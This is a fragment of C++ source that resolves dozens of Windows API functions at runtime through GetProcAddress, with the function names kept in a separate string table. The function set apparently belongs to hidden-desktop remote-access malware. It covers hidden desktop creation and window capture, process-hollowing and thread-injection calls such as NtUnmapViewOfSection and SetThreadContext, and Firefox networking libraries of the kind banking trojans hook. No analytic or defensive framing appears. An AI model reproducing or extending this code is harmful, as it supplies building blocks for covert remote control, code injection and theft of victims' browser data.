   Funcs::pReleaseMutex                   = (Types::T_ReleaseMutex)                   Funcs::pGetProcAddress(hKernel32, Strs::releaseMutex);
   Funcs::pNtCreateThreadEx               = (Types::T_NtCreateThreadEx)               Funcs::pGetProcAddress(hNtdll, Strs::ntCreateThreadEx);
   Funcs::pTerminateProcess               = (Types::T_TerminateProcess)               Funcs::pGetProcAddress(hKernel32, Strs::terminateProcess);
   Funcs::pFindWindowA                    = (Types::T_FindWindow)                     Funcs::pGetProcAddress(hUser32, Strs::findWindowA);
   Funcs::pGetWindowThreadProcessId       = (Types::T_GetWindowThreadProcessId)       Funcs::pGetProcAddress(hUser32, Strs::getWindowThreadProcessId);
   Funcs::pWaitForSingleObject            = (Types::T_WaitForSingleObject)            Funcs::pGetProcAddress(hKernel32, Strs::waitForSingleObject);
   Funcs::pEnumWindows                    = (Types::T_EnumWindows)                    Funcs::pGetProcAddress(hUser32, Strs::enumWindows);
   Funcs::pGetCurrentProcessId            = (Types::T_GetCurrentProcessId)            Funcs::pGetProcAddress(hKernel32, Strs::getCurrentProcessId);
   Funcs::pDeleteFileA                    = (Types::T_DeleteFile)                     Funcs::pGetProcAddress(hKernel32, Strs::deleteFileA);
   Funcs::pPathFileExistsA                = (Types::T_PathFileExists)                 Funcs::pGetProcAddress(hShlwapi, Strs::pathFileExistsA);
   Funcs::pCreateDirectoryA               = (Types::T_CreateDirectory)                Funcs::pGetProcAddress(hKernel32, Strs::createDirectoryA);
   Funcs::pHttpQueryInfoA                 = (Types::T_HttpQueryInfo)                  Funcs::pGetProcAddress(hWininet, Strs::httpQueryInfoA);
   Funcs::pHttpQueryInfoW                 = (Types::T_HttpQueryInfo)                  Funcs::pGetProcAddress(hWininet, Strs::httpQueryInfoW);
   Funcs::pRtlCompressBuffer              = (Types::T_RtlCompressBuffer)              Funcs::pGetProcAddress(hNtdll, Strs::rtlCompressBuffer);
   Funcs::pRtlGetCompressionWorkSpaceSize = (Types::T_RtlGetCompressionWorkSpaceSize) Funcs::pGetProcAddress(hNtdll, Strs::rtlGetCompressionWorkSpaceSize);
   Funcs::pSetThreadDesktop               = (Types::T_SetThreadDesktop)               Funcs::pGetProcAddress(hUser32, Strs::setThreadDesktop);
   Funcs::pCreateDesktopA                 = (Types::T_CreateDesktop)                  Funcs::pGetProcAddress(hUser32, Strs::createDesktopA);
   Funcs::pOpenDesktopA                   = (Types::T_OpenDesktop)                    Funcs::pGetProcAddress(hUser32, Strs::openDesktopA);
   Funcs::pTerminateThread                = (Types::T_TerminateThread)                Funcs::pGetProcAddress(hKernel32, Strs::terminateThread);
   Funcs::pPostMessageA                   = (Types::T_PostMessage)                    Funcs::pGetProcAddress(hUser32, Strs::postMessageA);
   Funcs::pSendMessageA                   = (Types::T_PostMessage)                    Funcs::pGetProcAddress(hUser32, Strs::sendMessageA);
   Funcs::pChildWindowFromPoint           = (Types::T_ChildWindowFromPoint)           Funcs::pGetProcAddress(hUser32, Strs::childWindowFromPoint);
   Funcs::pScreenToClient                 = (Types::T_ScreenToClient)                 Funcs::pGetProcAddress(hUser32, Strs::screenToClient);
   Funcs::pMoveWindow                     = (Types::T_MoveWindow)                     Funcs::pGetProcAddress(hUser32, Strs::moveWindow);
   Funcs::pGetWindowRect                  = (Types::T_GetWindowRect)                  Funcs::pGetProcAddress(hUser32, Strs::getWindowRect);
   Funcs::pGetMenuItemID                  = (Types::T_GetMenuItemID)                  Funcs::pGetProcAddress(hUser32, Strs::getMenuItemID);
   Funcs::pMenuItemFromPoint              = (Types::T_MenuItemFromPoint)              Funcs::pGetProcAddress(hUser32, Strs::menuItemFromPoint);
   Funcs::pRealGetWindowClassA            = (Types::T_RealGetWindowClass)             Funcs::pGetProcAddress(hUser32, Strs::realGetWindowClassA);
   Funcs::pPtInRect                       = (Types::T_PtInRect)                       Funcs::pGetProcAddress(hUser32, Strs::ptInRect);
   Funcs::pGetWindowPlacement             = (Types::T_GetWindowPlacement)             Funcs::pGetProcAddress(hUser32, Strs::getWindowPlacement);
   Funcs::pGetWindowLongA                 = (Types::T_GetWindowLong)                  Funcs::pGetProcAddress(hUser32, Strs::getWindowLongA);
   Funcs::pSetWindowLongA                 = (Types::T_SetWindowLong)                  Funcs::pGetProcAddress(hUser32, Strs::setWindowLongA);
   Funcs::pWindowFromPoint                = (Types::T_WindowFromPoint)                Funcs::pGetProcAddress(hUser32, Strs::windowFromPoint);
   Funcs::pSHAppBarMessage                = (Types::T_SHAppBarMessage)                Funcs::pGetProcAddress(hShell32, Strs::shAppBarMessage);
   Funcs::pRegQueryValueExA               = (Types::T_RegQueryValueEx)                Funcs::pGetProcAddress(hAdvapi32, Strs::regQueryValueExA);
   Funcs::pGetDesktopWindow               = (Types::T_GetDesktopWindow)               Funcs::pGetProcAddress(hUser32, Strs::getDesktopWindow);
   Funcs::pDeleteDC                       = (Types::T_DeleteDC)                       Funcs::pGetProcAddress(hGdi32, Strs::deleteDc);
   Funcs::pReleaseDC                      = (Types::T_ReleaseDC)                      Funcs::pGetProcAddress(hUser32, Strs::releaseDc);
   Funcs::pDeleteObject                   = (Types::T_DeleteObject)                   Funcs::pGetProcAddress(hGdi32, Strs::deleteObject);
   Funcs::pGetDIBits                      = (Types::T_GetDIBits)                      Funcs::pGetProcAddress(hGdi32, Strs::getDiBits);
   Funcs::pStretchBlt                     = (Types::T_StretchBlt)                     Funcs::pGetProcAddress(hGdi32, Strs::stretchBlt);
   Funcs::pSetStretchBltMode              = (Types::T_SetStretchBltMode)              Funcs::pGetProcAddress(hGdi32, Strs::setStretchBltMode);                                                             
   Funcs::pSelectObject                   = (Types::T_SelectObject)                   Funcs::pGetProcAddress(hGdi32, Strs::selectObject);
   Funcs::pCreateCompatibleDC             = (Types::T_CreateCompatibleDC)             Funcs::pGetProcAddress(hGdi32, Strs::createCompatibleDc);
   Funcs::pCreateCompatibleBitmap         = (Types::T_CreateCompatibleBitmap)         Funcs::pGetProcAddress(hGdi32, Strs::createCompatibleBitmap);
   Funcs::pGetDC                          = (Types::T_GetDC)                          Funcs::pGetProcAddress(hUser32, Strs::getDc);
   Funcs::pIsWindowVisible                = (Types::T_IsWindowVisible)                Funcs::pGetProcAddress(hUser32, Strs::isWindowVisible);
   Funcs::pGetWindow                      = (Types::T_GetWindow)                      Funcs::pGetProcAddress(hUser32, Strs::getWindow);
   Funcs::pBitBlt                         = (Types::T_BitBlt)                         Funcs::pGetProcAddress(hGdi32, Strs::bitBlt);
   Funcs::pPrintWindow                    = (Types::T_PrintWindow)                    Funcs::pGetProcAddress(hUser32, Strs::printWindow);
   Funcs::pGetTopWindow                   = (Types::T_GetTopWindow)                   Funcs::pGetProcAddress(hUser32, Strs::getTopWindow);
   Funcs::pNtUnmapViewOfSection           = (Types::T_NtUnmapViewOfSection)           Funcs::pGetProcAddress(hNtdll, Strs::ntUnmapViewOfSection);
   Funcs::pNtQueryInformationProcess      = (Types::T_NtQueryInformationProcess)      Funcs::pGetProcAddress(hNtdll, Strs::ntQueryInformationProcess);
   Funcs::pGetThreadContext               = (Types::T_GetThreadContext)               Funcs::pGetProcAddress(hKernel32, Strs::getThreadContext);
   Funcs::pSetThreadContext               = (Types::T_SetThreadContext)               Funcs::pGetProcAddress(hKernel32, Strs::setThreadContext);
   Funcs::pSHFileOperationA               = (Types::T_SHFileOperation)                Funcs::pGetProcAddress(hShell32, Strs::shFileOperationA);
   Funcs::pFindFirstFileA                 = (Types::T_FindFirstFile)                  Funcs::pGetProcAddress(hKernel32, Strs::findFirstFileA);
   Funcs::pFindNextFileA                  = (Types::T_FindNextFile)                   Funcs::pGetProcAddress(hKernel32, Strs::findNextFileA);

   Strs::wNtdll      = Utf8toUtf16(Strs::ntdll);
   Strs::wNspr4dll   = Utf8toUtf16(Strs::nspr4dll);
   Strs::wNss3dll    = Utf8toUtf16(Strs::nss3dll);
   Strs::wWininet    = Utf8toUtf16(Strs::wininet);
   Strs::wKernel32   = Utf8toUtf16(Strs::kernel32);
   Strs::wKernelBase = Utf8toUtf16(Strs::kernelBase);
}
